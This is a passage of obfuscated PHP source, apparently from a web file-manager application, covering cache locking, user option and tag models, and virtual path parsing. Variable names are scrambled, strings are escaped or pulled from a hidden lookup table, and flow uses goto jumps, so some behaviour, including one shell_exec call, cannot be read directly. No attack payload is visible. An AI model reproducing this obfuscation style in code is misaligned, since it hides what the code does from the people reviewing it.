$‰×ì¥äş[$§Ü˜Ñ±­[887]] ? $‰×ì¥äş[$§Ü˜Ñ±­[887]] : $§Ü˜Ñ±­[223]; if ($÷£Íè“Ë == $§Ü˜Ñ±­[31] && $Ô©ÙéÊ¶ == $§Ü˜Ñ±­[23]) { $÷£Íè“Ë = $§Ü˜Ñ±­[223]; } switch ($÷£Íè“Ë) { case $§Ü˜Ñ±­[890]: self::$handle = new CacheLockRedis(); break; case $§Ü˜Ñ±­[891]: self::$handle = new CacheLockMemcached(); break; case $§Ü˜Ñ±­[31]: self::$handle = new CacheLockDatabase(); break; case $§Ü˜Ñ±­[223]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($§Ü˜Ñ±­[903], $§Ü˜Ñ±­[904]); } return self::$handle; } private static function key($Ê’ƒ“ÄÄ) { return $_SERVER[ˆûùúÊ¯][905] . Cache::key($Ê’ƒ“ÄÄ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($·á‚á = '') { self::$errorMsg = $·á‚á; } public static function lockGlobal($˜ğ½É³, $¢÷Ã·ìÚ) { return self::lock($˜ğ½É³, $¢÷Ã·ìÚ, !0); } public static function lock($½Šé¾, $à»˜Ùº = false, $ÌÅ¬Ì¿‡ = false) { $ßÁŒ‡•» =& $_SERVER[ˆûùúÊ¯]; $Ë‹ÊÜ½ = self::init(); $ÅÏ¬©Á£ = self::key($½Šé¾); $à»˜Ùº = $à»˜Ùº ? $à»˜Ùº : self::$timeout; $º¨ûÜƒ• = timeFloat(); $¯´¢í“² = $Ë‹ÊÜ½->lock($ÅÏ¬©Á£, $à»˜Ùº); $üâİªæ· = timeFloat(); if (!$¯´¢í“²) { $õÂˆ´£ = "\x6c\x6f\143\153\x20\145\x72\x72\x6f\x72\x3b\x6b\x65\x79\x3d{$½Šé¾}\73\x74\151\x6d\x65\x3d{$à»˜Ùº}\x3b" . self::$errorMsg . $ßÁŒ‡•»[81] . get_caller_msg(); $£­ £ˆı = LNG($ßÁŒ‡•»[906]) . "\50{$à»˜Ùº}\163\51\56" . LNG($ßÁŒ‡•»[907]); $£­ £ˆı .= $ßÁŒ‡•»[908]; if (is_string(self::$errorMsg) && self::$errorMsg) { $£­ £ˆı = $£­ £ˆı . $ßÁŒ‡•»[909] . self::$errorMsg; } write_log($ßÁŒ‡•»[910] . sprintf($ßÁŒ‡•»[911], timeFloat() - $º¨ûÜƒ•) . $ßÁŒ‡•»[912] . $õÂˆ´£ . $ßÁŒ‡•»[913] . error_get_last(), $ßÁŒ‡•»[904]); show_json($£­ £ˆı, !1); } if (!$ÌÅ¬Ì¿‡) { self::$lockItem[$ÅÏ¬©Á£] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $È–£•ÉÂ = number_format(timeFloat() - $üâİªæ·, 3); write_log($ßÁŒ‡•»[914] . $½Šé¾ . $ßÁŒ‡•»[915] . $È–£•ÉÂ, $ßÁŒ‡•»[904]); } return $¯´¢í“²; } public static function lockGet($¿¡Óê¤Ã) { $ĞÍ¤ï÷Ö = self::key($¿¡Óê¤Ã); if (self::$lockItem[$ĞÍ¤ï÷Ö]) { return self::$lockItem[$ĞÍ¤ï÷Ö]; } return self::init()->lockGet($ĞÍ¤ï÷Ö); } public static function unlock($¡‡à†Ú») { $Æ±¼•“¼ =& $_SERVER[ˆûùúÊ¯]; $É¯Š–ô® = self::key($¡‡à†Ú»); self::$lockItem[$É¯Š–ô®] = null; self::init()->unlock($É¯Š–ô®); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Æ±¼•“¼[916] . $¡‡à†Ú», $Æ±¼•“¼[904]); } return; } public static function unlockRuntime() { $”‘Äº™„ =& $_SERVER[ˆûùúÊ¯]; $ÄÓíø¹ = self::init(); $Àş¿ÅàÃ = !1; foreach (self::$lockItem as $®ô€—æ => $Ê•Íœ‹É) { if (!$Ê•Íœ‹É) { continue; } $ÄÓíø¹->unlock($®ô€—æ); if (!$Àş¿ÅàÃ) { $Àş¿ÅàÃ = !0; write_log($”‘Äº™„[917] . $®ô€—æ . $”‘Äº™„[81] . get_caller_msg(), $”‘Äº™„[904]); continue; } write_log($”‘Äº™„[917] . $®ô€—æ, $”‘Äº™„[904]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $›³›À• = number_format(timeFloat() - TIME_FLOAT, 3); write_log($”‘Äº™„[918] . $›³›À• . $”‘Äº™„[919] . ACTION, $”‘Äº™„[904]); } } public static function fileLock($Ó¶»ØíÃ) { $Ó½àÈÒ° =& $_SERVER[ˆûùúÊ¯]; if (!$GLOBALS[$Ó½àÈÒ°[920]]) { $GLOBALS[$Ó½àÈÒ°[920]] = array(); } $GLOBALS[$Ó½àÈÒ°[920]][$Ó¶»ØíÃ] = !1; $ÖëŞö¹õ = fopen(DATA_PATH . $Ó¶»ØíÃ . $Ó½àÈÒ°[921], $Ó½àÈÒ°[922]); if (!$ÖëŞö¹õ) { return !1; } $GLOBALS[$Ó½àÈÒ°[920]][$Ó¶»ØíÃ] = $ÖëŞö¹õ; if (flock($ÖëŞö¹õ, LOCK_EX)) { return !0; } self::unlock($Ó¶»ØíÃ); show_json($Ó½àÈÒ°[923], !1); return !1; } public static function fileUnlock($îîÁìÙ‡) { $£É˜¹¸û =& $_SERVER[ˆûùúÊ¯]; $›°™Å¢× = $GLOBALS[$£É˜¹¸û[920]][$îîÁìÙ‡]; if (!$›°™Å¢×) { return; } $GLOBALS[$£É˜¹¸û[920]][$îîÁìÙ‡] = !1; flock($›°™Å¢×, LOCK_UN); fclose($›°™Å¢×); } public static function fileUnlockAll() { $Á ¨ë =& $_SERVER[ˆûùúÊ¯]; if (!$GLOBALS[$Á ¨ë[920]]) { return; } foreach ($GLOBALS[$Á ¨ë[920]] as $Ùö… ÔÁ => $¤¯ñ´¹ã) { if (!$¤¯ñ´¹ã) { continue; } $GLOBALS[$Á ¨ë[920]][$Ùö… ÔÁ] = !1; flock($¤¯ñ´¹ã, LOCK_UN); fclose($¤¯ñ´¹ã); } $GLOBALS[$Á ¨ë[920]] = array(); } } goto déÙÕ–£Œ’; b—Ùó³Îáè: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\x5f\157\x70\x74\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ê¼¯Ôœ¿) { $‡ôİèÄ‘ =& $_SERVER[ˆûùúÊ¯]; $ÉÖ¿Ò À = defined($‡ôİèÄ‘[2117]) && USER_ID ? USER_ID : $‡ôİèÄ‘[12]; return "\125\163\x65\x72\x4f\160\164\x69\157\156\x5f{$ê¼¯Ôœ¿}\137" . $ÉÖ¿Ò À; } protected function filterWhere($ş‡î½Ï) { $’«Æ¸ÖÌ =& $_SERVER[ˆûùúÊ¯]; $ş‡î½Ï[$’«Æ¸ÖÌ[1704]] = defined($’«Æ¸ÖÌ[2117]) && USER_ID ? USER_ID : $’«Æ¸ÖÌ[12]; return $ş‡î½Ï; } public function cacheRemoveUser($×Å‡Ù‰, $æ½äŞ´†) { return Cache::remove("\125\163\x65\162\x4f\160\x74\x69\x6f\156\x5f{$×Å‡Ù‰}\x5f" . $æ½äŞ´†); } protected function optionDefault($îØ»ÁÔÏ = '') { $Ù¾êì² =& $_SERVER[ˆûùúÊ¯]; if ($îØ»ÁÔÏ == $Ù¾êì²[12]) { return $GLOBALS[$Ù¾êì²[6]][$Ù¾êì²[2394]]; } if ($îØ»ÁÔÏ == $Ù¾êì²[2395]) { return $GLOBALS[$Ù¾êì²[6]][$Ù¾êì²[2396]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\x2e\x74\x61\x67\114\151\163\164"; public $modelType = "\125\163\x65\x72\x4f\160\x74\151\x6f\x6e"; public $field = array("\156\141\155\145", "\x73\164\x79\x6c\x65", "\x73\x6f\162\164"); public function listData($‡â…Áƒî = false, $‡Ø­¶„ = "\x73\x6f\x72\x74", $‚à€ûù‹ = false) { return parent::listData($‡â…Áƒî, $‡Ø­¶„, $‚à€ûù‹); } public function remove($œ¶»·°·) { return parent::remove($œ¶»·°·); } public function add($ üºÜõı, $°‘ˆª‰… = "\154\x61\x62\145\154\55\147\162\145\171\55\156\157\x72\x6d\x61\x6c") { $û¼¹‹¬Â =& $_SERVER[ˆûùúÊ¯]; if ($this->findByName($ üºÜõı)) { return !1; } $é¬Ñü°ğ = array($û¼¹‹¬Â[470] => $ üºÜõı, $û¼¹‹¬Â[534] => $°‘ˆª‰…, $û¼¹‹¬Â[1900] => $this->getSort($û¼¹‹¬Â[310]) + 1); return parent::insert($é¬Ñü°ğ); } public function update($”¯Ñ—Ë€, $¥®ûïÉÅ) { $íÏÄçî‡ =& $_SERVER[ˆûùúÊ¯]; $·ñ¬èî = $this->listData($”¯Ñ—Ë€); $òßöØ× = $this->findByName($¥®ûïÉÅ[$íÏÄçî‡[42]]); if (!$·ñ¬èî || $òßöØ× && $òßöØ×[$íÏÄçî‡[451]] != $·ñ¬èî[$íÏÄçî‡[451]]) { return !1; } return parent::update($”¯Ñ—Ë€, $¥®ûïÉÅ); } public function moveTop($éñÕã¶) { $ÊêÉæ» =& $_SERVER[ˆûùúÊ¯]; $¥Ûæ¿¿ = parent::listData(); $Ô…ºÁáÍ = $this->getSort($ÊêÉæ»[309]); foreach ($¥Ûæ¿¿ as &$„½Æ­½”) { if ($„½Æ­½”[$ÊêÉæ»[451]] == $éñÕã¶) { $„½Æ­½”[$ÊêÉæ»[1920]] = $Ô…ºÁáÍ; continue; } $„½Æ­½”[$ÊêÉæ»[1920]] += 1; } unset($„½Æ­½”); return parent::resetData($¥Ûæ¿¿); } public function moveBottom($ğ¦õ×æ¢) { $Š§àğñ™ =& $_SERVER[ˆûùúÊ¯]; $Ò¿Üƒ£ = $this->getSort($Š§àğñ™[310]) + 1; return parent::update($ğ¦õ×æ¢, array($Š§àğñ™[1920] => $Ò¿Üƒ£)); } public function resetSort($ô¢íäŞÚ) { $ÉûÛ“½› =& $_SERVER[ˆûùúÊ¯]; $ëÄı®Î = array(); $ô¢íäŞÚ = is_array($ô¢íäŞÚ) ? $ô¢íäŞÚ : array(); for ($Ç½Š ‚ = 0; $Ç½Š ‚ < count($ô¢íäŞÚ); $Ç½Š ‚++) { $ëÄı®Î[$ô¢íäŞÚ[$Ç½Š ‚] . $ÉûÛ“½›[12]] = $Ç½Š ‚ + 1; } $ü’Öê¡ = parent::listData(); foreach ($ü’Öê¡ as &$µÕÔÖÉ) { $­ºúüÑä = $ëÄı®Î[$µÕÔÖÉ[$ÉûÛ“½›[451]]]; $µÕÔÖÉ[$ÉûÛ“½›[1920]] = $­ºúüÑä ? $­ºúüÑä : $µÕÔÖÉ[$ÉûÛ“½›[1920]]; } unset($µÕÔÖÉ); return parent::resetData($ü’Öê¡); } private function getSort($üşç Üô) { $«÷—ÀãÖ =& $_SERVER[ˆûùúÊ¯]; $ŸÓåÇÆ = parent::listData(); $ğ¸‹Öà = array_to_keyvalue($ŸÓåÇÆ, $«÷—ÀãÖ[12], $«÷—ÀãÖ[1920]); if (!$ğ¸‹Öà) { $ğ¸‹Öà = array(0); } $ÙÒíÏ³Á = $üşç Üô == $«÷—ÀãÖ[310] ? max($ğ¸‹Öà) : min($ğ¸‹Öà); return intval($ÙÒíÏ³Á); } } goto Cì”ğ…ºÓ; bê Ä‡Ï…À: class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\162\x63\x65\175"; const KOD_USER_RECYCLE = "\173\x75\x73\x65\x72\122\145\143\171\143\154\145\175"; const KOD_USER_FAV = "\173\x75\163\x65\162\106\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\145\x72\106\151\154\145\124\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\163\145\x72\106\151\x6c\x65\124\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\147\162\x6f\165\x70\x52\157\157\x74\123\145\x6c\146\175"; const KOD_USER_SHARE = "\173\165\163\145\162\x53\x68\141\x72\145\175"; const KOD_USER_SHARE_LINK = "\173\165\163\145\x72\123\150\x61\x72\x65\114\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\162\145\x54\x6f\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\141\162\x65\111\x74\145\155\175"; const KOD_SHARE_LINK = "\173\x73\150\x61\162\x65\111\164\x65\155\114\151\156\153\175"; const KOD_SEARCH = "\x7b\x73\x65\141\162\143\x68\x7d"; const KOD_BLOCK = "\x7b\142\x6c\157\143\153\x7d"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\173\x75\163\x65\162\x52\145\x6e\143\145\x6e\x74\175"; const KOD_USER_DRIVER = "\x7b\144\162\x69\x76\145\x72\175"; public static function typeList() { $áèûÏ  =& $_SERVER[ˆûùúÊ¯]; return array($áèûÏ [1312] => self::KOD_SOURCE, $áèûÏ [1313] => self::KOD_USER_RECYCLE, $áèûÏ [1314] => self::KOD_USER_FAV, $áèûÏ [1315] => self::KOD_USER_FILE_TAG, $áèûÏ [1316] => self::KOD_USER_FILE_TYPE, $áèûÏ [1317] => self::KOD_GROUP_ROOT_SELF, $áèûÏ [1318] => self::KOD_USER_SHARE, $áèûÏ [1319] => self::KOD_USER_SHARE_LINK, $áèûÏ [1320] => self::KOD_USER_SHARE_TO_ME, $áèûÏ [1321] => self::KOD_SHARE_ITEM, $áèûÏ [1322] => self::KOD_SHARE_LINK, $áèûÏ [1323] => self::KOD_SEARCH, $áèûÏ [1324] => self::KOD_BLOCK, $áèûÏ [1325] => self::KOD_IO, $áèûÏ [1326] => self::KOD_USER_RECENT, $áèûÏ [1327] => self::KOD_USER_DRIVER); } public static function parse($™é„˜¾Å) { $ÈŞôØˆ¸ =& $_SERVER[ˆûùúÊ¯]; $™é„˜¾Å = self::clear($™é„˜¾Å); $”¤£Íï = array_values(self::typeList()); preg_match($ÈŞôØˆ¸[1328], $™é„˜¾Å, $†Ú×ÉÖ); $˜åÎªäú = array($ÈŞôØˆ¸[472] => !1, $ÈŞôØˆ¸[1329] => !1, $ÈŞôØˆ¸[469] => !1, $ÈŞôØˆ¸[94] => $™é„˜¾Å, $ÈŞôØˆ¸[1230] => !1, $ÈŞôØˆ¸[1229] => $ÈŞôØˆ¸[12]); if (is_array($†Ú×ÉÖ) && count($†Ú×ÉÖ) == 5) { $ÛæÈ¶‡ó = $ÈŞôØˆ¸[1330] . $†Ú×ÉÖ[2] . $ÈŞôØˆ¸[379]; if (in_array($ÛæÈ¶‡ó, $”¤£Íï)) { $˜åÎªäú[$ÈŞôØˆ¸[1230]] = $†Ú×ÉÖ[1]; $˜åÎªäú[$ÈŞôØˆ¸[43]] = $ÛæÈ¶‡ó; $˜åÎªäú[$ÈŞôØˆ¸[1331]] = substr($ÛæÈ¶‡ó, 1, -1); $˜åÎªäú[$ÈŞôØˆ¸[451]] = $†Ú×ÉÖ[3]; } $˜åÎªäú[$ÈŞôØˆ¸[1229]] = $†Ú×ÉÖ[4]; } $üŸõÚÈ‰ = array($ÈŞôØˆ¸[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $˜åÎªäú[$ÈŞôØˆ¸[1294]] = in_array($˜åÎªäú[$ÈŞôØˆ¸[43]], $üŸõÚÈ‰); return $˜åÎªäú; } public static function isTruePath($¸Öïıñ) { $‘ÅÈ¡€ =& $_SERVER[ˆûùúÊ¯]; if (substr($¸Öïıñ, 0, 1) != $‘ÅÈ¡€[1330]) { return !0; } if (strpos($¸Öïıñ, $‘ÅÈ¡€[459]) === 0) { return !0; } if (strpos($¸Öïıñ, $‘ÅÈ¡€[1298]) === 0) { return !0; } if (strpos($¸Öïıñ, $‘ÅÈ¡€[1332]) === 0) { return !0; } if (strpos($¸Öïıñ, $‘ÅÈ¡€[1333]) === 0) { return !0; } if (strpos($¸Öïıñ, $‘ÅÈ¡€[1334]) === 0) { return !0; } return !1; } public static function clear($êáË´…¹) { $–Ü¨ÔšŞ =& $_SERVER[ˆûùúÊ¯]; $êáË´…¹ = str_replace(array($–Ü¨ÔšŞ[1139], $–Ü¨ÔšŞ[18]), $–Ü¨ÔšŞ[63], $êáË´…¹); $êáË´…¹ = str_replace($–Ü¨ÔšŞ[107], $–Ü¨ÔšŞ[8], $êáË´…¹); $î«º½«‹ = $–Ü¨ÔšŞ[1335]; if (substr($êáË´…¹, 0, 3) == $–Ü¨ÔšŞ[1336]) { $êáË´…¹ = substr($êáË´…¹, 3); } while (strstr($êáË´…¹, $î«º½«‹)) { $êáË´…¹ = str_replace($î«º½«‹, $–Ü¨ÔšŞ[8], $êáË´…¹); } $êáË´…¹ = preg_replace($–Ü¨ÔšŞ[1337], $–Ü¨ÔšŞ[8], $êáË´…¹); if ($êáË´…¹ == $–Ü¨ÔšŞ[8]) { return $–Ü¨ÔšŞ[8]; } $êáË´…¹ = rtrim($êáË´…¹, $–Ü¨ÔšŞ[8]); return $êáË´…¹; } public static function pathTrue($øâÂ™) { $Ï”¹†Ğ =& $_SERVER[ˆûùúÊ¯]; if (!$øâÂ™) { return $Ï”¹†Ğ[12]; } $ï÷È‘’Ÿ = strlen($øâÂ™); if (substr($øâÂ™, $ï÷È‘’Ÿ - 1, 1) == $Ï”¹†Ğ[8]) { $øâÂ™ = substr($øâÂ™, 0, $ï÷È‘’Ÿ - 1); } $øâÂ™ = str_replace($Ï”¹†Ğ[569], $Ï”¹†Ğ[8], str_replace($Ï”¹†Ğ[1338], $Ï”¹†Ğ[8], $øâÂ™)); if (substr($øâÂ™, 0, 2) == $Ï”¹†Ğ[1339]) { $øâÂ™ = substr($øâÂ™, 2); } if (!strstr($øâÂ™, $Ï”¹†Ğ[1336])) { return $øâÂ™; } $òÈ÷£İ˜ = explode($Ï”¹†Ğ[8], $øâÂ™); $ÖáŒÓ†• = array_search($Ï”¹†Ğ[1340], $òÈ÷£İ˜); if ($ÖáŒÓ†• >= 0) { $òÈ÷£İ˜[$ÖáŒÓ†•] = -1; } if ($ÖáŒÓ†• > 0) { $òÈ÷£İ˜[$ÖáŒÓ†• - 1] = -1; } $İ À­è³ = array(); foreach ($òÈ÷£İ˜ as $é»¥ğó¼) { if ($é»¥ğó¼ !== -1) { $İ À­è³[] = $é»¥ğó¼; } } return self::pathTrue(implode($Ï”¹†Ğ[8], $İ À­è³)); } public static function sourceID($®¢ĞÎíŠ) { $³š¢ã¤œ =& $_SERVER[ˆûùúÊ¯]; $½×˜£ˆ³ = self::parse($®¢ĞÎíŠ); if ($½×˜£ˆ³[$³š¢ã¤œ[43]] !== self::KOD_SOURCE) { show_json(LNG($³š¢ã¤œ[1341]), !1); } return $½×˜£ˆ³[$³š¢ã¤œ[451]]; } public static function make($ÈƒáñÅà) { if (!$ÈƒáñÅà) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÈƒáñÅà)); } public static function makeShare($Ÿ±ùƒ÷£, $×ßğ›û‹) { return self::makePath(self::KOD_SHARE_ITEM, $Ÿ±ùƒ÷£, $×ßğ›û‹); } public static function makeFileTypePath($Ë°œ€“Î) { return self::makePath(self::KOD_USER_FILE_TYPE, $Ë°œ€“Î); } public static function makeFileTagPath($Ş¼“±¿) { return self::makePath(self::KOD_USER_FILE_TAG, $Ş¼“±¿); } public static function makePath($Ä×íÛü, $‹–»İœ¡ = '', $™“É· = '') { $‡ó©ÒŠ» =& $_SERVER[ˆûùúÊ¯]; $ùÅÃÅêû = substr($Ä×íÛü, 1, -1); $ùÏıŸ« = $‡ó©ÒŠ»[1342] . $ùÅÃÅêû . $‡ó©ÒŠ»[1343] . $‹–»İœ¡ . $‡ó©ÒŠ»[1344]; $ùÏıŸ« = $™“É· ? $ùÏıŸ« . $™“É· . $‡ó©ÒŠ»[8] : $ùÏıŸ«; return $ùÏıŸ«; } public static function hashPath($ÃşÉÇğê, $ñ–œ§¦Ñ = true) { $Å±°²œ =& $_SERVER[ˆûùúÊ¯]; $³İôäö = is_array($ÃşÉÇğê) ? $ÃşÉÇğê : IO::info($ÃşÉÇğê); $ÖÛâùàî = _get($³İôäö, $Å±°²œ[1345], $Å±°²œ[12]); if (!$ÖÛâùàî && isset($³İôäö[$Å±°²œ[228]])) { $ÖÛâùàî = trim($³İôäö[$Å±°²œ[228]], $Å±°²œ[128]); } if (!$ÖÛâùàî && isset($³İôäö[$Å±°²œ[190]]) && $³İôäö[$Å±°²œ[190]]) { $³İôäö = IO::info(KodIO::make($³İôäö[$Å±°²œ[190]])); $ÖÛâùàî = _get($³İôäö, $Å±°²œ[1345], $Å±°²œ[12]); } $Óíøìüæ = md5($³İôäö[$Å±°²œ[94]] . $³İôäö[$Å±°²œ[86]] . $³İôäö[$Å±°²œ[95]]); if (!$ÖÛâùàî && $ñ–œ§¦Ñ && file_exists($³İôäö[$Å±°²œ[94]])) { $ÖÛâùàî = Cache::get($Óíøìüæ . $Å±°²œ[1346]); $ÖÛâùàî = !1; if (!$ÖÛâùàî) { $ÖÛâùàî = IO::hashSimple($³İôäö[$Å±°²œ[94]]); Cache::set($Óíøìüæ . $Å±°²œ[1346], $ÖÛâùàî, 3600 * 24 * 30); } } return $ÖÛâùàî ? $ÖÛâùàî : $Óíøìüæ; } public static function hashPathSafe($ş™¬îŸ², $ö˜í­‹ = true) { $¦ë ÖŸ° =& $_SERVER[ˆûùúÊ¯]; $øÀŠàŠô = self::hashPath($ş™¬îŸ², $ö˜í­‹); return md5($øÀŠàŠô . $¦ë ÖŸ°[1347] . Model($¦ë ÖŸ°[830])->get($¦ë ÖŸ°[831])); } public static function initSystemPath() { $ûøèñùò =& $_SERVER[ˆûùúÊ¯]; if (defined($ûøèñùò[1348])) { return; } define($ûøèñùò[1348], self::systemPath($ûøèñùò[188])); define($ûøèñùò[1349], self::systemPath($ûøèñùò[1350])); define($ûøèñùò[1351], self::systemPath($ûøèñùò[1352])); define($ûøèñùò[1353], self::systemPath($ûøèñùò[1354])); IOHistory::bindEvent(); } public static function systemPath($¦„ê½««) { $ ƒÏ¬ğ… =& $_SERVER[ˆûùúÊ¯]; $Æ¬ñÓ„ñ = $ ƒÏ¬ğ…[1355] . ucfirst($¦„ê½««); $“»É‰ìÑ = Model($ ƒÏ¬ğ…[830])->get($Æ¬ñÓ„ñ); if ($“»É‰ìÑ) { return $“»É‰ìÑ; } if ($¦„ê½«« == $ ƒÏ¬ğ…[188]) { $“»É‰ìÑ = self::make(Model($ ƒÏ¬ğ…[885])->systemRootPathAdd($ ƒÏ¬ğ…[582])); } else { $“»É‰ìÑ = self::systemPath($ ƒÏ¬ğ…[188]); $ã½¸¶• = self::sourceID($“»É‰ìÑ); $“»É‰ìÑ = self::make(Model($ ƒÏ¬ğ…[885])->mkdir($ã½¸¶•, $¦„ê½««)); } Model($ ƒÏ¬ğ…[830])->set($Æ¬ñÓ„ñ, $“»É‰ìÑ); return $“»É‰ìÑ; } public static function systemFolder($ÄÉãç…ü) { $¡Â¬‰²™ = IO_PATH_SYSTEM_SOURCE . $ÄÉãç…ü; $Öì»—õ³ = Cache::get($¡Â¬‰²™); if (!$Öì»—õ³) { $ Ì“»—À = IO::infoFullSimple($¡Â¬‰²™); if (!$ Ì“»—À) { $Öì»—õ³ = IO::mkdir($¡Â¬‰²™, REPEAT_SKIP); } else { $Öì»—õ³ = $ Ì“»—À[$_SERVER[ˆûùúÊ¯][94]]; } Cache::set($¡Â¬‰²™, $Öì»—õ³, 3600 * 10); } return $Öì»—õ³; } public static function defaultDriver() { return Model($_SERVER[ˆûùúÊ¯][827])->defaultDriver(); } public static function defaultIO() { $¬ü¿’ôö =& $_SERVER[ˆûùúÊ¯]; $ÎÇÊ²‰« = self::defaultDriver(); return $¬ü¿’ôö[1356] . $ÎÇÊ²‰«[$¬ü¿’ôö[451]] . $¬ü¿’ôö[1344]; } public static function defaultDriverInit() { static $¥ÎÈ‹Ê† = false; if ($¥ÎÈ‹Ê†) { return $¥ÎÈ‹Ê†; } $¥ÎÈ‹Ê† = IO::init(self::defaultIO()); return $¥ÎÈ‹Ê†; } public static function fileTypeList() { $êïÖøƒÊ =& $_SERVER[ˆûùúÊ¯]; $Ù´ŸÊÖå = $GLOBALS[$êïÖøƒÊ[6]][$êïÖøƒÊ[1357]]; foreach ($Ù´ŸÊÖå as $Ó’Ñ°»™ => $…ÓúĞè¼) { $ŸøàÓ™š = $êïÖøƒÊ[1358] . $Ó’Ñ°»™; $·şÍò«– = LNG($ŸøàÓ™š); if ($ŸøàÓ™š != $·şÍò«–) { $Ù´ŸÊÖå[$Ó’Ñ°»™][$êïÖøƒÊ[42]] = $·şÍò«–; } } return $Ù´ŸÊÖå; } public static function diskList($„ÆËÈš´ = true) { $ıô¯ˆó = $_SERVER[ˆûùúÊ¯][1359]; if ($„ÆËÈš´) { $¾¢Õ˜‰§ = Cache::get($ıô¯ˆó); if (is_array($¾¢Õ˜‰§)) { return $¾¢Õ˜‰§; } } $¾¢Õ˜‰§ = self::diskListGet(); Cache::set($ıô¯ˆó, $¾¢Õ˜‰§, 60); return $¾¢Õ˜‰§; } public static function diskListGet() { $±‘©½ =& $_SERVER[ˆûùúÊ¯]; $»¡É¿ç = array(); if ($GLOBALS[$±‘©½[6]][$±‘©½[1360]] == $±‘©½[1361]) { $æäªÊ­ø = $±‘©½[1362]; for ($§ïşš±ˆ = 0; $§ïşš±ˆ < strlen($æäªÊ­ø); $§ïşš±ˆ++) { $Âß÷Ì®¤ = $æäªÊ­ø[$§ïşš±ˆ] . $±‘©½[1363]; if (file_exists($Âß÷Ì®¤)) { $»¡É¿ç[] = $Âß÷Ì®¤; } } return $»¡É¿ç; } if (!function_exists($±‘©½[108])) { $»¡É¿ç[] = $±‘©½[896]; return $»¡É¿ç; } $§°–°›â = explode($±‘©½[18], shell_exec($±‘©½[1364])); array_shift($§°–°›â); array_pop($§°–°›â); $‘À‰ßÇ¥ = array($±‘©½[1365], $±‘©½[1366], $±‘©½[1367], $±‘©½[1368], $±‘©½[1369], $±‘©½[1370], $±‘©½[1371], $±‘©½[1372]); foreach ($§°–°›â as $Ä…Ãíî™) { $ÈçÓ‘Äö = preg_split($±‘©½[1373], $Ä…Ãíî™); $Âß÷Ì®¤ = $ÈçÓ‘Äö[count($ÈçÓ‘Äö) - 1]; if (!strstr($ÈçÓ‘Äö[0], $±‘©½[1374]) || !$Âß÷Ì®¤) { continue; } $öÜçÕ… = rtrim($Âß÷Ì®¤, $±‘©½[8]) . $±‘©½[8]; if (in_array($öÜçÕ…, $‘À‰ßÇ¥)) { continue; } $»¡É¿ç[] = $öÜçÕ…; } return $»¡É¿ç; } public static function isSameDisk($ä»ù·¯ô, $½§Ëôï÷) { $š„“ŠÎ´ =& $_SERVER[ˆûùúÊ¯]; if ($GLOBALS[$š„“ŠÎ´[6]][$š„“ŠÎ´[1360]] == $š„“ŠÎ´[1361]) { return strtolower(substr($ä»ù·¯ô, 0, 1)) == strtolower(substr($½§Ëôï÷, 0, 1)); } $±Ş¢ñ¦ = self::diskList(); $µ–¨Ö = !1; $æï‰°Îê = !1; sort($±Ş¢ñ¦); $±Ş¢ñ¦ = array_reverse($±Ş¢ñ¦); $ä»ù·¯ô = rtrim($ä»ù·¯ô, $š„“ŠÎ´[8]) . $š„“ŠÎ´[8]; $½§Ëôï÷ = rtrim($½§Ëôï÷, $š„“ŠÎ´[8]) . $š„“ŠÎ´[8]; foreach ($±Ş¢ñ¦ as $ÎùÄœº) { $¼á¹ãÍÇ = strlen($ÎùÄœº); if (!$µ–¨Ö && substr($ä»ù·¯ô, 0, $¼á¹ãÍÇ) == $ÎùÄœº) { $µ–¨Ö = $ÎùÄœº; } if (!$æï‰°Îê && substr($½§Ëôï÷, 0, $¼á¹ãÍÇ) == $ÎùÄœº) { $æï‰°Îê = $ÎùÄœº; } if ($µ–¨Ö && $æï‰°Îê) { break; } } return $µ–¨Ö === $æï‰°Îê; } public static function transferType($øéˆ—œ, $ùûêÚå) { $ÈÜ´Çõ× =& $_SERVER[ˆûùúÊ¯]; $ø•‘Íåı = self::driverType($øéˆ—œ); $•Ãú®§ó = self::driverType($ùûêÚå); if ($ø•‘Íåı[$ÈÜ´Çõ×[43]] == $•Ãú®§ó[$ÈÜ´Çõ×[43]] && $ø•‘Íåı[$ÈÜ´Çõ×[1375]] == $•Ãú®§ó[$ÈÜ´Çõ×[1375]]) { return $ÈÜ´Çõ×[1376]; } if ($ø•‘Íåı[$ÈÜ´Çõ×[43]] == $ÈÜ´Çõ×[929] && $•Ãú®§ó[$ÈÜ´Çõ×[43]] == $ÈÜ´Çõ×[116]) { return $ÈÜ´Çõ×[1255]; } if ($ø•‘Íåı[$ÈÜ´Çõ×[43]] == $ÈÜ´Çõ×[116] && $•Ãú®§ó[$ÈÜ´Çõ×[43]] == $ÈÜ´Çõ×[929]) { return $ÈÜ´Çõ×[117]; } return $ÈÜ´Çõ×[1377]; } public static function driverType($Å¼Åã“º) { $Æ¯ÚàŠÙ =& $_SERVER[ˆûùúÊ¯]; $æšïõÄ† = str_replace($Æ¯ÚàŠÙ[1378], $Æ¯ÚàŠÙ[12], strtolower($Å¼Åã“º->getType())); if ($æšïõÄ† == $Æ¯ÚàŠÙ[817] || $æšïõÄ† == $Æ¯ÚàŠÙ[1379] || $æšïõÄ† == $Æ¯ÚàŠÙ[1380]) { $Å¼Åã“º = self::defaultDriverInit(); } else { if ($æšïõÄ† == $Æ¯ÚàŠÙ[1265] || $æšïõÄ† == $Æ¯ÚàŠÙ[1381]) { $Å¼Åã“º = IO::init($Å¼Åã“º->pathParse[$Æ¯ÚàŠÙ[1212]]); } } $»ıì¢û× = $Å¼Åã“º->path; 